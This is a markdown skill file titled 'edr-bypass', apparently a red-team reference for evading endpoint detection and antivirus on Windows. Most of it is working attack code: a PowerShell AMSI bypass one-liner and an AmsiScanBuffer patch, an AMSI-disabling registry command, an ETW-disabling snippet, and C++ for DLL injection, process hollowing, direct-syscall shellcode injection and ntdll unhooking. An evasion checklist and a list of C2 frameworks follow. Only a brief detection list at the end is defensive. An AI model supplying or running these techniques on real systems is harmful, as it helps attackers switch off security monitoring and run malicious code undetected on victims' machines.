---
name: edr-bypass
description: EDR/AV evasion, unhooking, direct syscalls, process injection.
---

# EDR Bypass Techniques

## 1. AMSI Bypass (PowerShell)

```powershell
# Method 1: Reflection (patch amsiInitFailed)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,[IntPtr]::Zero)

# Method 2: Patching AmsiScanBuffer
[Runtime.InteropServices.Marshal]::Copy([Byte[]](0x18,0xc3),0,[IntPtr]($f.GetValue($null)+0x10),2)

# Method 3: Disable via registry (requires admin)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "Enabled" -Value 0
```

## 2. ETW Bypass

```powershell
# Disable ETW logging (Event Tracing for Windows)
$etw = [System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
# Or patch EtwEventWrite
```

## 3. Process Injection

### Classic DLL Injection
```cpp
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, mem, dllPath, sizeof(dllPath), NULL);
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), mem, 0, NULL);
```

### Process Hollowing
```cpp
// 1. Create suspended process
CreateProcess("target.exe", ..., CREATE_SUSPENDED, ...)
// 2. Unmap original image
NtUnmapViewOfSection(hProc, baseAddr)
// 3. Allocate new memory
VirtualAllocEx(hProc, ...)
// 4. Write malicious image
WriteProcessMemory(hProc, ...)
// 5. Set context and resume
SetThreadContext(...); ResumeThread(...)
```

### Syscalls (Direct)
```cpp
// Bypass user-mode hooks by calling Nt* functions directly
// Using SysWhispers or HellsGate
NtAllocateVirtualMemory(hProc, &baseAddr, 0, &regionSize, MEM_COMMIT, PAGE_READWRITE);
NtWriteVirtualMemory(hProc, baseAddr, shellcode, sizeof(shellcode), NULL);
NtProtectVirtualMemory(hProc, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
```

## 4. Unhooking

```cpp
// Restore ntdll.dll from disk
HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// Read clean bytes
// Write over hooked bytes in memory
```

## 5. Defense Evasion Checklist

| Technique | Description |
|-----------|-------------|
| Obfuscation | Base64, string concatenation, AES encryption |
| AMSI bypass | Patch amsiInitFailed / AmsiScanBuffer |
| ETW bypass | Disable Event Tracing for Windows |
| Syscalls | Direct syscall to bypass user-mode hooks |
| Process injection | DLL injection, process hollowing, APC |
| Unhooking | Restore ntdll.dll from disk |
| Token manipulation | Impersonate SYSTEM token |
| Fileless | Run entirely in memory |

## 6. Tools

| Tool | Purpose |
|------|---------|
| SysWhispers | Direct syscall generation |
| Cobalt Strike | Commercial C2 with evasion |
| Sliver | Open-source C2 |
| Havoc | Modern C2 framework |
| ScareCrow | Payload creation framework |
| Nimcrypt2 | Nim-based packer |

## 7. Detection

- Behavioral analysis (unusual API call patterns)
- Memory scanning (unmapped memory regions)
- ETW telemetry
- Call stack analysis
- YARA rules for known shellcode patterns
